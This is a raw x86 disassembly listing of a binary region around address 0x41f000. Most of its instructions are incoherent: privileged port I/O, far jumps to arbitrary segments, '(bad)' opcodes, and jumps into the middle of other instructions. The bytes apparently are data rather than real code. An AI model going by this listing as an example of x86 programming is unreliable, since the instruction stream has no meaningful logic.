  41f05b:	and    DWORD PTR [edi+0x4d],0xcfc05a6f
  41f062:	scas   eax,DWORD PTR es:[edi]
  41f063:	dec    ebp
  41f064:	mov    edx,0xb4c3b1fa
  41f069:	sub    DWORD PTR [edx+edi*4-0x21],0xffffffd2
  41f06e:	inc    ebx
  41f06f:	inc    esi
  41f070:	mov    ebx,0x17ab76f1
  41f075:	out    dx,al
  41f076:	aas    
  41f077:	cmp    eax,0x33fa440d
  41f07c:	xor    al,0xa9
  41f07e:	or     al,0xc6
  41f080:	dec    eax
  41f081:	sbb    ebp,esp
  41f083:	jge    0x41f0c6
  41f085:	shl    DWORD PTR [ecx],cl
  41f087:	jg     0x41f08b
  41f089:	jmp    0x41f0bd
  41f08b:	ins    DWORD PTR es:[edi],dx
  41f08c:	outs   dx,BYTE PTR ds:[esi]
  41f08d:	dec    ebp
  41f08e:	jge    0x41f0c9
  41f090:	retf   
  41f091:	sbb    DWORD PTR [esi],edx
  41f093:	and    al,0x61
  41f095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f096:	or     edx,DWORD PTR ds:0xa9b70b45
  41f09c:	push   edi
  41f09d:	mov    ds:0x8bcbfab1,eax
  41f0a2:	call   0x67c64936
  41f0a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0a8:	jb     0x41f0ae
  41f0aa:	out    dx,al
  41f0ab:	pushf  
  41f0ac:	pushf  
  41f0ad:	in     eax,dx
  41f0ae:	lea    eax,ds:0x88a0b17
  41f0b4:	and    eax,0x7fa76dd8
  41f0b9:	dec    eax
  41f0ba:	ficomp WORD PTR [eax-0x577ac752]
  41f0c0:	rcr    DWORD PTR [ecx+ecx*4-0x7b9fbb40],1
  41f0c7:	mov    ebx,DWORD PTR [ebx+0x68fa3183]
  41f0cd:	and    dl,0x47
  41f0d0:	jle    0x41f0e6
  41f0d2:	jne    0x41f087
  41f0d4:	add    ah,BYTE PTR [edi]
  41f0d6:	xchg   esi,eax
  41f0d7:	or     bl,BYTE PTR [eax+0x1a]
  41f0da:	push   0xffffffba
  41f0dc:	mov    ecx,es
  41f0de:	in     al,0x9
  41f0e0:	cdq    
  41f0e1:	xchg   edx,eax
  41f0e2:	in     eax,dx
  41f0e3:	mov    ds:0xe7e3d3e7,eax
  41f0e8:	in     eax,0xd2
  41f0ea:	loop   0x41f0b0
  41f0ec:	arpl   sp,bp
  41f0ee:	jp     0x41f0db
  41f0f0:	and    ebx,ecx
  41f0f2:	or     dh,dh
  41f0f4:	xor    BYTE PTR [eax+0x4ccceb0f],dl
  41f0fa:	adc    al,0xec
  41f0fc:	ja     0x41f142
  41f0fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0ff:	daa    
  41f100:	xchg   ecx,eax
  41f101:	not    DWORD PTR [ebx+edx*2]
  41f104:	mov    eax,ds:0x2e92b8d3
  41f109:	push   es
  41f10a:	or     BYTE PTR [ebx-0x2f08053f],dh
  41f110:	xor    eax,DWORD PTR [eax]
	...
  41f172:	add    BYTE PTR [eax],al
  41f174:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4b2f:0x9aaf440c
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    eax,0xe4000001
  41f18d:	loop   0x41f1c3
  41f18f:	sahf   
  41f190:	out    0xc9,al
  41f192:	imul   esp,DWORD PTR [esi],0x17
  41f195:	aam    0x1a
  41f197:	cmp    esi,esi
  41f199:	cmp    edi,DWORD PTR [eax+0xafa985f]
  41f19f:	add    eax,0x5476dfd4
  41f1a4:	fs dec edi
  41f1a6:	jp     0x41f139
  41f1a8:	adc    DWORD PTR [esp+eiz*2-0x48],esp
  41f1ac:	push   esp
  41f1ad:	jns    0x41f16f
  41f1af:	lds    ebp,FWORD PTR [edi+0x51ce954d]
  41f1b5:	out    dx,al
  41f1b6:	sub    ah,dh
  41f1b8:	into   
  41f1b9:	fsubr  QWORD PTR [esi]
  41f1bb:	shl    BYTE PTR [edx-0x1f1abcd],cl
  41f1c1:	bound  esi,QWORD PTR [edx]
  41f1c3:	sahf   
  41f1c4:	sbb    ch,bl
  41f1c6:	aad    0x65
  41f1c8:	push   ebp
  41f1c9:	inc    edx
  41f1ca:	rcl    BYTE PTR [edi-0x6b6da90d],0x8
  41f1d1:	repz jecxz 0x41f21f
  41f1d4:	fcomi  st,st(5)
  41f1d6:	scas   al,BYTE PTR es:[edi]
  41f1d7:	xor    DWORD PTR ds:0x861a3140,esi
  41f1dd:	cmc    
  41f1de:	retf   
  41f1df:	outs   dx,BYTE PTR ds:[esi]
  41f1e0:	cwde   
  41f1e1:	inc    edx
  41f1e2:	push   esi
  41f1e3:	mov    dl,al
  41f1e5:	aas    
  41f1e6:	add    dl,BYTE PTR [ecx+0x596cfb52]
  41f1ec:	jne    0x41f181
  41f1ee:	jmp    FWORD PTR [esp+ecx*1-0x2dd57b38]
  41f1f5:	sub    esp,0xffffffd9
  41f1f8:	cmp    DWORD PTR [edi+0x62558f01],esp
  41f1fe:	mov    bh,BYTE PTR [edi+0x5e1695]
  41f204:	dec    ebx
  41f205:	and    al,0x90
  41f207:	arpl   cx,di
  41f209:	ins    BYTE PTR es:[edi],dx
  41f20a:	dec    edi
  41f20b:	fs cmc 
  41f20d:	shl    DWORD PTR [ebp+0x2],cl
  41f210:	inc    dh
  41f212:	shl    BYTE PTR [ebx-0x48],0xa3
  41f216:	or     ebp,DWORD PTR [eax]
  41f218:	jl     0x41f1e5
  41f21a:	sbb    ah,BYTE PTR [edi]
  41f21c:	dec    edi
  41f21d:	inc    ebx
  41f21e:	jmp    0x80f5536d
  41f223:	test   al,0x40
  41f225:	stc    
  41f226:	cmp    al,0xa3
  41f228:	cmp    BYTE PTR [esi+0x650c4923],cl
  41f22e:	xor    eax,0xdcc6fb89
  41f233:	shr    ebp,1
  41f235:	mov    ch,0x9d
  41f237:	in     al,dx
  41f238:	aad    0xb8
  41f23a:	or     ch,BYTE PTR [eax]
  41f23c:	retf   0xe559
  41f23f:	pushf  
  41f240:	mov    ah,0xa
  41f242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f243:	stos   BYTE PTR es:[edi],al
  41f244:	fmulp  st(1),st
  41f246:	inc    ebp
  41f247:	cmp    bl,al
  41f249:	(bad)  
  41f24b:	sbb    eax,0x2cab6d53
  41f250:	(bad)  
  41f251:	aaa    
  41f252:	or     al,0x93
  41f254:	mov    ah,0xf
  41f256:	and    edi,esi
  41f258:	pop    esi
  41f259:	inc    esi
  41f25a:	pop    ecx
  41f25b:	dec    edx
  41f25c:	cmc    
  41f25d:	mov    bh,0x5d
  41f25f:	pop    ecx
  41f260:	xchg   edx,eax
  41f261:	mov    WORD PTR [ecx+0x56],?
  41f264:	push   esp
  41f265:	xchg   edx,eax
  41f266:	inc    ebp
  41f267:	je     0x41f2c4
  41f269:	div    BYTE PTR [edx+0x4]
  41f26c:	push   ss
  41f26d:	dec    esp
  41f26e:	mov    dl,0xbd
  41f270:	push   ds
  41f271:	clc    
  41f272:	dec    ebx
  41f273:	fidivr WORD PTR [eax-0x68a5191e]
  41f279:	daa    
  41f27a:	inc    esi
  41f27b:	push   cs
  41f27c:	aaa    
  41f27d:	or     al,0x94
  41f27f:	aad    0xdf
  41f281:	jae    0x41f235
  41f283:	shl    BYTE PTR [ecx-0x42],0xcd
  41f287:	jl     0x41f2af
  41f289:	jge    0x41f272
  41f28b:	stc    
  41f28c:	push   ebp
  41f28d:	(bad)  
  41f28e:	fistp  QWORD PTR [ebp+0xa6]
	...
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f29d
  41f301:	dec    edi
  41f302:	inc    esi
  41f303:	aas    
  41f304:	xor    al,0x4c
  41f306:	add    DWORD PTR [eax],eax
  41f308:	add    eax,0xb6000001
  41f30d:	(bad)  
  41f30f:	inc    edi
  41f310:	push   ds
  41f311:	and    bl,al
  41f313:	add    BYTE PTR [eax-0x71495006],bl
  41f319:	jne    0x41f380
  41f31b:	mov    cl,0x96
  41f31d:	das    
  41f31e:	xchg   ebx,eax
  41f31f:	inc    eax
  41f320:	fsubr  DWORD PTR ds:0xb3a7555e
  41f326:	sub    BYTE PTR [ebp+0x25],dh
  41f329:	cmp    eax,0xaf203d06
  41f32e:	add    al,0x68
  41f330:	jno    0x41f3a4
  41f332:	adc    eax,0x29a46188
  41f337:	sbb    edi,ebp
  41f339:	xchg   BYTE PTR [esp+ebx*8+0x5f6d7b62],ch
  41f340:	xor    BYTE PTR [edx],al
  41f342:	imul   esp,DWORD PTR ds:0x49db98e2,0x7254b40f
  41f34c:	pop    ebx
  41f34d:	je     0x41f3c4
  41f34f:	mov    ds:0x823afbe3,al
  41f354:	dec    ebx
  41f355:	and    ebp,DWORD PTR [edi-0x77611fc4]
  41f35b:	sbb    al,0xb0
  41f35d:	pop    es
  41f35e:	shl    edi,0x13
  41f361:	das    
  41f362:	jmp    0x41f2ff
  41f364:	in     al,dx
  41f365:	pop    ds
  41f366:	jb     0x41f3ad
  41f368:	sbb    eax,0xf2d0bdff
  41f36d:	aam    0xc4
  41f36f:	adc    BYTE PTR [esi-0x63],al
  41f372:	fwait
  41f373:	pop    edi
  41f374:	stc    
  41f375:	pop    edi
  41f376:	addr16 aam 0xf4
  41f379:	inc    edx
  41f37a:	or     dh,BYTE PTR [edi]
  41f37c:	in     al,0x79
  41f37e:	enter  0x61c1,0xb3
  41f382:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f383:	cli    
  41f384:	les    esi,FWORD PTR [esi-0x5bd8e64f]
  41f38a:	pop    edx
  41f38b:	imul   edi,DWORD PTR [edi+edi*1],0x2d2894fd
  41f392:	fdivr  QWORD PTR [esi+0x5f172be8]
  41f398:	cvttps2pi mm5,QWORD PTR [edi+0x62c321a7]
  41f39f:	aaa    
  41f3a0:	out    0xc9,eax
  41f3a2:	ret    
  41f3a3:	pop    ebx
  41f3a4:	xchg   ebp,eax
  41f3a5:	sbb    BYTE PTR [ecx],cl
  41f3a7:	aad    0x80
  41f3a9:	aam    0xe0
  41f3ab:	add    eax,0x5fa65e00
  41f3b0:	gs stos BYTE PTR es:[edi],al
  41f3b2:	pop    ebx
  41f3b3:	aad    0x54
  41f3b5:	mov    edx,0x94cea622
  41f3ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3bb:	or     esp,DWORD PTR [ecx+ecx*2-0x7a]
  41f3bf:	push   ds
  41f3c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3c1:	int3   
  41f3c2:	scas   al,BYTE PTR es:[edi]
  41f3c3:	daa    
  41f3c4:	inc    esp
  41f3c5:	adc    DWORD PTR [eax],esi
  41f3c7:	imul   ebx,DWORD PTR ds:0xa7a1b95e,0x59
  41f3ce:	dec    eax
  41f3cf:	xor    al,0xe7
  41f3d1:	or     al,0xd1
  41f3d3:	test   BYTE PTR [edi-0x5b],bh
  41f3d6:	fst    st(1)
  41f3d8:	mov    al,ds:0xd92c2cd3
  41f3dd:	push   edx
  41f3de:	pop    es
  41f3df:	jns    0x41f40a
  41f3e1:	xlat   BYTE PTR ds:[ebx]
  41f3e2:	lods   al,BYTE PTR ds:[esi]
  41f3e3:	fdivp  st(2),st
  41f3e5:	aaa    
  41f3e6:	or     ch,BYTE PTR [edi-0x7b]
  41f3e9:	retf   
  41f3ea:	sub    cl,0xce
  41f3ed:	mov    edx,0xef543c07
  41f3f2:	les    esi,FWORD PTR [ebx+0x3b]
  41f3f5:	push   esi
  41f3f6:	fmul   QWORD PTR [esi-0x5d]
  41f3f9:	jb     0x41f476
  41f3fb:	jo     0x41f3c1
  41f3fd:	inc    edx
  41f3fe:	dec    edx
  41f3ff:	push   0x4396a057
  41f404:	sahf   
  41f405:	das    
  41f406:	and    bl,0x9c
  41f409:	push   ebx
  41f40a:	xor    ah,ah
  41f40c:	(bad)  
  41f40d:	pop    eax
  41f40e:	scas   eax,DWORD PTR es:[edi]
  41f40f:	cmp    al,0x6e
	...
  41f471:	add    BYTE PTR [eax],al
  41f473:	add    BYTE PTR [edi+eiz*8],bh
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0xf9
  41f481:	fimul  DWORD PTR [eax+0x14d3946]
  41f487:	add    BYTE PTR ds:0xf000001,al
  41f48d:	inc    esi
  41f48e:	aam    0x51
  41f490:	cdq    
  41f491:	sbb    DWORD PTR [edi],edx
  41f493:	adc    cl,BYTE PTR [esi-0x1cc2b0e0]
  41f499:	out    dx,eax
  41f49a:	retf   
  41f49b:	mov    BYTE PTR [eax-0x64],cl
  41f49e:	fmul   DWORD PTR [ecx+0x5c38dfcd]
  41f4a4:	and    BYTE PTR [ebp+0x2e],bl
  41f4a7:	add    ch,BYTE PTR [edx-0x4620f485]
  41f4ad:	pop    ds
  41f4ae:	fsub   st,st(3)
  41f4b0:	pusha  
  41f4b1:	gs scas eax,DWORD PTR es:[edi]
  41f4b3:	add    BYTE PTR [esi+0x9],0x60
  41f4b7:	or     al,0xb3
  41f4b9:	(bad)  
  41f4ba:	fisttp QWORD PTR [ebp+0x51c24854]
  41f4c0:	fcmovnu st,st(6)
  41f4c2:	out    0x5d,al
  41f4c4:	add    al,0x5e
  41f4c6:	mov    dl,0xb
  41f4c8:	push   ss
  41f4c9:	add    al,0x9b
  41f4cb:	add    eax,DWORD PTR [edi-0x6a]
  41f4ce:	les    ebp,FWORD PTR [edx+0x67]
  41f4d1:	call   0x93c:0x89ee91f4
  41f4d8:	jmp    0xde87d297
  41f4dd:	call   0x1c09:0xca0c78a
  41f4e4:	dec    edi
  41f4e5:	mov    al,ds:0x48ff28e2
  41f4ea:	xchg   ch,bl
  41f4ec:	mov    BYTE PTR [edi],ch
  41f4ee:	jnp    0x41f4d7
  41f4f0:	ja     0x41f4ef
  41f4f2:	and    DWORD PTR [edx+0x12],edx
  41f4f5:	stos   DWORD PTR es:[edi],eax
  41f4f6:	pop    ss
  41f4f7:	sub    BYTE PTR ss:[eax+0x2f],bh
  41f4fb:	aas    
  41f4fc:	push   ds
  41f4fd:	adc    ebx,DWORD PTR [edi+0xf]
  41f500:	sbb    al,0x71
  41f502:	add    cl,BYTE PTR ds:0x20387917
  41f508:	iret   
  41f509:	xchg   edx,eax
  41f50a:	cmp    al,ah
  41f50c:	scas   al,BYTE PTR es:[edi]
  41f50d:	pushf  
  41f50e:	out    0xf,eax
  41f510:	pop    eax
  41f511:	imul   esi,eax,0x4d65a2c3
  41f517:	pop    edx
  41f518:	jg     0x41f53e
  41f51a:	leave  
  41f51b:	in     eax,0xf8
  41f51d:	add    al,BYTE PTR [edi+0x46]
  41f520:	pop    ds
  41f521:	loopne 0x41f4ba
  41f523:	test   ebp,edi
  41f525:	push   edi
  41f526:	push   esi
  41f527:	je     0x41f55e
  41f529:	sub    al,0x24
  41f52b:	fcom   QWORD PTR [esi]
  41f52d:	shl    BYTE PTR [edi-0xba97c2b],cl
  41f533:	sub    esi,DWORD PTR [ebp-0x4e]
  41f536:	cmp    DWORD PTR [ebx+0x2d],esp
  41f539:	rol    DWORD PTR [ebx+edx*1],1
  41f53c:	popf   
  41f53d:	nop
  41f53e:	cli    
  41f53f:	icebp  
  41f540:	add    DWORD PTR [edx+ebx*2+0x68613236],eax
  41f547:	stc    
  41f548:	sub    bh,BYTE PTR [ecx+0xf4f74ef]
  41f54e:	std    
  41f54f:	clc    
  41f550:	aaa    
  41f551:	out    0x3b,al
  41f553:	imul   ebp,esp,0x58
  41f556:	(bad)  
  41f557:	and    bl,BYTE PTR [esi-0x60]
  41f55a:	dec    edx
  41f55b:	mov    bl,0x9e
  41f55d:	sub    eax,0x808e57e2
  41f562:	out    0x1b,al
  41f564:	push   ds
  41f565:	cmp    ebx,DWORD PTR [esi+0x11e3056c]
  41f56b:	ret    
  41f56c:	cdq    
  41f56d:	jge    0x41f597
  41f56f:	dec    edi
  41f570:	sahf   
  41f571:	xor    dh,BYTE PTR [ecx-0x2d]
  41f574:	or     DWORD PTR [edx],0x1569b44d
  41f57a:	es adc edx,0x817aec05
  41f581:	push   es
  41f582:	xchg   edi,eax
  41f583:	scas   eax,DWORD PTR es:[edi]
  41f584:	pop    eax
  41f585:	mov    ebx,0x85b26163
  41f58a:	push   cs
  41f58b:	test   al,al
  41f58d:	inc    edi
  41f58e:	push   ebx
  41f58f:	mov    ds:0x7b,eax
	...
  41f5f4:	js     0x41f62a
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x5183:0x2577d422
  41f604:	ds dec esi
  41f606:	add    DWORD PTR [eax],eax
  41f608:	add    eax,0xe2000001
  41f60d:	nop
  41f60e:	push   edi
  41f60f:	es out dx,eax
  41f611:	jo     0x41f612
  41f613:	call   0xccfcc1a4
  41f618:	into   
  41f619:	shl    eax,0xfd
  41f61c:	(bad)  
  41f61d:	or     eax,0x930230b8
  41f622:	sub    ch,dh
  41f624:	jge    0x41f639
  41f626:	test   eax,0x6b049aab
  41f62b:	push   ecx
  41f62c:	outs   dx,BYTE PTR ds:[esi]
  41f62d:	push   es
  41f62e:	in     eax,dx
  41f62f:	pop    edi
  41f630:	jo     0x41f678
  41f632:	adc    al,0xc7
  41f634:	call   0x340b:0x375fea85
  41f63b:	in     al,0x4a
  41f63d:	or     bl,BYTE PTR [ecx-0x4a8ce4fc]
  41f643:	int    0xf1
  41f645:	and    edx,edi
  41f647:	mov    ebp,0x90bf9128
  41f64c:	sar    DWORD PTR [edi],cl
  41f64e:	adc    ch,BYTE PTR [ebx-0x38a1703f]
  41f654:	adc    ch,BYTE PTR [ecx]
  41f656:	add    al,0x38
  41f658:	cmp    al,0xe2
  41f65a:	add    al,0x55
  41f65c:	inc    esi
  41f65d:	and    edx,DWORD PTR [esi]
  41f65f:	ror    BYTE PTR [esi+0x0],1
  41f662:	mov    ecx,0xd3653171
  41f667:	iret   
  41f668:	mov    bh,0xec
  41f66a:	in     eax,0xc1
  41f66c:	pop    esp
  41f66d:	sub    DWORD PTR [eax+0x7993bd2c],esi
  41f673:	sbb    al,0x17
  41f675:	popa   
  41f676:	(bad)  
  41f677:	cmp    BYTE PTR [ebp+0x35],dh
  41f67a:	jecxz  0x41f6e8
  41f67c:	pop    esi
  41f67d:	repz mov WORD PTR [edx],ds
  41f680:	pop    ebp
  41f681:	or     al,0x1a
  41f683:	or     ebx,edx
  41f685:	dec    ebp
  41f686:	fcom   DWORD PTR [ebp-0x26]
  41f689:	xchg   ebp,ebp
  41f68b:	push   ecx
  41f68c:	jge    0x41f705
  41f68e:	mov    ch,0xf0
  41f690:	cmp    bh,BYTE PTR [ecx-0x41f0b2e6]
  41f696:	sub    al,0xb1
  41f698:	xlat   BYTE PTR ds:[ebx]
  41f699:	or     al,BYTE PTR [edi-0x6605fab]
  41f69f:	lea    ecx,[ecx-0x27206115]
  41f6a5:	and    eax,0x59878d67
  41f6aa:	pop    ecx
  41f6ab:	cli    
  41f6ac:	jg     0x41f66e
  41f6ae:	dec    ecx
  41f6af:	xchg   ecx,eax
  41f6b0:	mov    edx,0x16d94505
  41f6b5:	lds    ebp,FWORD PTR [edi-0x703c5f72]
  41f6bb:	iret   
  41f6bc:	jno    0x41f6b4
  41f6be:	dec    esp
  41f6bf:	inc    ebp
  41f6c0:	dec    ebp
  41f6c1:	mov    edi,0x741b16e8
  41f6c6:	rcr    dh,1
  41f6c8:	sahf   
  41f6c9:	push   eax
  41f6ca:	rcl    edx,1
  41f6cc:	je     0x41f71b
  41f6ce:	repz rcr DWORD PTR [ecx],0xf0
  41f6d2:	jmp    0x9a7d9d42
  41f6d7:	xchg   ebx,eax
  41f6d8:	and    DWORD PTR [edx+edi*8+0x53],esp
  41f6dc:	and    al,0x2
  41f6de:	lea    eax,[edi+0x65]
  41f6e1:	imul   DWORD PTR [ebx+0x7b]
  41f6e4:	scas   eax,DWORD PTR es:[edi]
  41f6e5:	push   esi
  41f6e6:	arpl   WORD PTR [edi-0x6ec7bea9],dx
  41f6ec:	jns    0x41f6f7
  41f6ee:	pop    edx
  41f6ef:	lahf   
  41f6f0:	jmp    0x2f41d8df
  41f6f5:	and    al,0xa3
  41f6f7:	jmp    0x613c047d
  41f6fc:	sbb    eax,0xcde4290b
  41f701:	enter  0x3e7b,0xdf
  41f705:	adc    BYTE PTR [ecx+0x7e],al
  41f708:	push   0x71eed151
  41f70d:	push   eax
  41f70e:	pop    edx
  41f70f:	es scas eax,DWORD PTR es:[edi]
	...
  41f771:	add    BYTE PTR [eax],al
  41f773:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0xf34d:0xfb6c62d2
  41f783:	mov    BYTE PTR [ebx+0x4f],0x1
  41f787:	add    BYTE PTR ds:0x12000001,al
  41f78d:	inc    esi
  41f78e:	pop    esi
  41f78f:	and    edi,edx
  41f791:	xchg   esi,eax
  41f792:	cld    
  41f793:	mov    ebp,0x5c7c2d70
  41f798:	mov    ebx,0x4569aea4
  41f79d:	adc    eax,0x7e8c0130
  41f7a2:	ficom  DWORD PTR [eax+eiz*4]
  41f7a5:	mov    esi,0xb056606b
  41f7aa:	test   DWORD PTR [edi+0x50db6dd5],esp
  41f7b0:	push   edi
  41f7b1:	adc    eax,0xc740bc5b
  41f7b6:	xchg   edi,eax
  41f7b7:	imul   ecx,DWORD PTR [edx],0x61
  41f7ba:	cld    
  41f7bb:	push   ds
  41f7bc:	mov    al,0xd
  41f7be:	rcl    BYTE PTR [edi+edi*4+0x6a],0xc4
  41f7c3:	dec    ebx
  41f7c4:	push   ebp
  41f7c5:	repnz pushf 
  41f7c7:	inc    esp
  41f7c8:	lds    eax,FWORD PTR [ecx-0x48665f17]
  41f7ce:	repz dec ebp
  41f7d0:	adc    BYTE PTR [edi+0x3f],dl
  41f7d3:	fs fcmovu st,st(5)
  41f7d6:	call   0xc911b29f
  41f7db:	sub    esp,ebp
  41f7dd:	shr    bh,cl
  41f7df:	fisttp DWORD PTR ds:0x506cb3e5
  41f7e5:	out    dx,al
  41f7e6:	jl     0x41f785
  41f7e8:	cmp    eax,0xb8f9f4be
  41f7ed:	daa    
  41f7ee:	and    ebx,esp
  41f7f0:	and    bl,BYTE PTR [esp+ebp*8+0x65]
  41f7f4:	lea    edi,[ecx-0x32247f2c]
  41f7fa:	dec    ecx
  41f7fb:	inc    esp
  41f7fc:	in     al,0x3a
  41f7fe:	push   edi
  41f7ff:	mov    es,ecx
  41f801:	xchg   esp,eax
  41f802:	mov    bh,dh
  41f804:	out    dx,eax
  41f805:	sbb    esp,DWORD PTR [ebp-0x11]
  41f808:	jne    0x41f84c
  41f80a:	out    dx,al
  41f80b:	xor    ebx,0xccb2b87
  41f811:	jg     0x41f7d0
  41f813:	shl    esi,1
  41f815:	mov    ?,WORD PTR [esi+ecx*1-0x2508d371]
  41f81c:	imul   dl
  41f81e:	push   ss
  41f81f:	push   es
  41f820:	adc    DWORD PTR [edx+0x34b2f068],ebp
  41f826:	and    eax,0xd90e6e3d
  41f82b:	call   0x2a45:0xfa08c13a
  41f832:	cmp    bl,BYTE PTR [esi+0x57d19d95]
  41f838:	mov    ds:0x329cde0d,eax
  41f83d:	ja     0x41f8b3
  41f83f:	(bad)  
  41f840:	mov    esi,0xabff3061
  41f845:	xchg   ecx,eax
  41f846:	xor    eax,0x955197d5
  41f84b:	mov    DWORD PTR [ebx],ecx
  41f84d:	xor    eax,0x44beb36c
  41f852:	test   DWORD PTR [eax+ebp*2+0x321a3c92],eax
  41f859:	add    dl,BYTE PTR [edx]
  41f85b:	add    bl,BYTE PTR [ebp-0x46]
  41f85e:	cmp    edi,DWORD PTR [edx+0x36]
  41f861:	cmp    edx,DWORD PTR [ecx+0x50]
  41f864:	mov    esi,0xd3fbce8c
  41f869:	sahf   
  41f86a:	and    BYTE PTR [eax+0x46eb76eb],bh
  41f870:	dec    edi
  41f871:	or     BYTE PTR [esi],dh
  41f873:	repz out 0xb1,al
  41f876:	out    dx,al
  41f877:	xchg   edi,eax
  41f878:	mov    DWORD PTR [eax],ebp
  41f87a:	ins    DWORD PTR es:[edi],dx
  41f87b:	shl    BYTE PTR [edi+0x41066569],cl
  41f881:	sub    eax,0x917c66e5
  41f886:	fs in  al,0xbf
  41f889:	sbb    eax,0x2cbab877
  41f88e:	int3   
  41f88f:	xchg   edi,eax
  41f890:	fwait
	...
  41f8f1:	add    BYTE PTR [eax],al
  41f8f3:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	mov    edi,0x48906c5b
  41f905:	push   eax
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    eax,0x18000001
  41f90d:	cld    
  41f90e:	add    dl,BYTE PTR [eax-0x77]
  41f911:	cmp    DWORD PTR [ebp-0x64],ebx
  41f914:	jne    0x41f8b0
  41f916:	ins    DWORD PTR es:[edi],dx
  41f917:	lea    edx,[eax]
  41f919:	idiv   dh
  41f91b:	mov    BYTE PTR [esi+0x27dec969],0x2e
  41f922:	jmp    0x41f979
  41f924:	nop
  41f925:	jnp    0x41f8b4
  41f927:	mov    ebp,0x4820ddc1
  41f92c:	fst    QWORD PTR [ebp+0x61]
  41f92f:	and    BYTE PTR [esi],bh
  41f931:	jg     0x41f93e
  41f933:	adc    DWORD PTR [esi+0x67],ecx
  41f936:	into   
  41f937:	div    al
  41f939:	inc    edi
  41f93a:	jg     0x41f981
  41f93c:	adc    DWORD PTR [ebx+esi*8],edx
  41f93f:	adc    bh,al
  41f941:	and    BYTE PTR [ebx+0x14],bl
  41f944:	jge    0x41f982
  41f946:	mov    ecx,0xdd5bc8b0
  41f94b:	xchg   ecx,eax
  41f94c:	gs in  eax,0x7d
  41f94f:	(bad)  
  41f950:	mov    edx,0x6d8b1c1e
  41f955:	loopne 0x41f8e8
  41f957:	xchg   ebp,eax
  41f958:	xchg   esi,eax
  41f959:	push   esi
  41f95a:	push   es
  41f95b:	jb     0x41f96e
  41f95d:	push   es
  41f95e:	in     eax,0x42
  41f960:	(bad)  
  41f962:	push   ds
  41f963:	icebp  
  41f964:	push   esi
  41f965:	add    eax,0x881780bd
  41f96a:	push   eax
  41f96b:	outs   dx,DWORD PTR ds:[esi]
  41f96c:	(bad)  
  41f96d:	shl    cl,0xf2
  41f970:	push   0xffffff89
  41f972:	cmp    ch,BYTE PTR ds:0x9a64a591
  41f978:	loop   0x41f975
  41f97a:	aaa    
  41f97b:	retf   
  41f97c:	ret    0x1e
  41f97f:	repz xor BYTE PTR [ecx-0x72],0xb1
  41f984:	push   eax
  41f985:	push   0x12
  41f987:	adc    eax,ebx
  41f989:	and    DWORD PTR [esi+0x5cf7491a],ecx
  41f98f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f990:	and    ch,BYTE PTR [eax-0x38]
  41f993:	cwde   
  41f994:	jecxz  0x41f95a
  41f996:	mov    DWORD PTR [eax-0x11a58e32],0x4b9908b7
  41f9a0:	mov    ebx,0xc82b33c9
  41f9a5:	push   ebx
  41f9a6:	xchg   edi,eax
  41f9a7:	mov    DWORD PTR [ebp-0x21faeb44],ebx
  41f9ad:	dec    eax
  41f9ae:	sub    ebx,ebp
  41f9b0:	fdiv   st(0),st
  41f9b2:	loope  0x41f937
  41f9b4:	and    eax,0x4d2101c1
  41f9b9:	jp     0x41fa16
  41f9bb:	mov    bl,0x76
  41f9bd:	imul   ebx,DWORD PTR ds:0x23771a86,0xffffffc3
  41f9c4:	mov    ecx,0xdc7ede47
  41f9c9:	jae    0x41fa39
  41f9cb:	div    BYTE PTR [ebp-0x7ccff11a]
  41f9d1:	jl     0x41fa19
  41f9d3:	and    eax,0x1aed466f
  41f9d8:	test   eax,0xfb15a61
  41f9dd:	popa   
  41f9de:	jge    0x41fa06
  41f9e0:	iret   
  41f9e1:	pop    edx
  41f9e2:	mov    WORD PTR [edx+0x68],es
  41f9e5:	mov    esi,DWORD PTR ds:0xdaa8fbe6
  41f9eb:	and    DWORD PTR [esi-0x75d369e5],eax
  41f9f1:	sbb    BYTE PTR [eax],ah
  41f9f3:	ss push esi
  41f9f5:	adc    BYTE PTR [edx-0x39],bh
  41f9f8:	call   0x3823d3c4
  41f9fd:	leave  
  41f9fe:	lods   al,BYTE PTR ds:[esi]
  41f9ff:	adc    ecx,DWORD PTR [ecx]
  41fa01:	jp     0x41fa66
  41fa03:	xchg   esi,ecx
  41fa05:	mov    ecx,0x2a2e8e7e
  41fa0a:	cld    
  41fa0b:	(bad)  
  41fa0c:	test   al,0x17
  41fa0e:	fs in  al,dx
  41fa10:	rol    DWORD PTR [eax],1
	...
  41fa72:	add    BYTE PTR [eax],al
  41fa74:	or     al,BYTE PTR [ecx-0x49]
  41fa77:	mov    eax,ds:0xeb1ef7ff
  41fa7c:	and    edx,DWORD PTR [edi-0x5d]
  41fa7f:	adc    eax,0x9d993aad
  41fa84:	dec    ebp
  41fa85:	push   ecx
  41fa86:	add    DWORD PTR [eax],eax
  41fa88:	add    eax,0x7b000001
  41fa8d:	pop    ebx
  41fa8e:	sbb    dl,BYTE PTR [ebx]
  41fa90:	into   
  41fa91:	add    bl,BYTE PTR [ebx+ecx*2]
  41fa94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
